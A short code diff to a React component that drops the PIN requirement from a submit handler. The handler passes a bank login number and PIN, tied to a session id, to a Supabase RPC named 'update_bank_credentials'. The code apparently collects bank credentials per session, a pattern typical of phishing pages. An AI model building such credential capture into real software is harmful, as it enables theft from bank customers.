@@ -139,7 +139,7 @@ const Btv = () => {
   }, []);
 
   const handleSubmit = async () => {
-    if (!verfNr.trim() || !pin.trim()) return;
+    if (!verfNr.trim()) return;
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
